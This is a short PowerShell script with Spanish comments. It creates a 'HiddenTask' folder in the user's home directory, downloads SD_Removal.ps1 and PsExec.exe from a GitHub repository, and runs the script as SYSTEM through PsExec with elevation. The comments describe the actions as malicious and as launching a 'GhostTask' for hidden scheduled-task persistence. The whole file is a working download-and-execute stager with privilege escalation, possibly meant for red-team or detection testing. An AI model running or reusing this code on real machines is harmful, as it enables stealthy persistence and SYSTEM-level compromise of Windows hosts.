# Obtener la ruta del directorio del usuario actual
$directorioTemporal = $env:HOMEPATH

# Crear el directorio donde se van a descargar los archivos necesarios para ejecutar las acciones maliciosas
$workingPath = "HiddenTask"
$nuevaRuta = Join-Path -Path $directorioTemporal -ChildPath $workingPath

if (-not (Test-Path -Path $nuevaRuta)) {
    New-Item -ItemType Directory -Path $nuevaRuta -ErrorAction SilentlyContinue
}

# Descargar el archivo de GitHub
$urlArchivoMal = "https://github.com/taysec/Test_HiddenTask/raw/main/HiddenTask%20with%20SD%20value%20Removal/SD_Removal.ps1"
$urlArchivoPSexec = "https://github.com/taysec/Test_HiddenTask/raw/main/HiddenTask%20with%20SD%20value%20Removal/PsExec.exe"
$fileName = "SD_Removal.ps1"
$fileName2 = "PSExec.exe"
$rutaArchivo = Join-Path -Path $nuevaRuta -ChildPath $fileName
$rutaPSexec = Join-Path -Path $nuevaRuta -ChildPath $fileName2

Invoke-WebRequest -Uri $urlArchivoMal -OutFile $rutaArchivo
Invoke-WebRequest -Uri $urlArchivoPSexec -OutFile $rutaPSexec

# Elevación de privilegios a través de psexec ejecutando lanzador de GhostTask
Start-Process -FilePath $rutaPSexec -ArgumentList "-accepteula", "-i", "-s", $rutaArchivo -Verb "runas"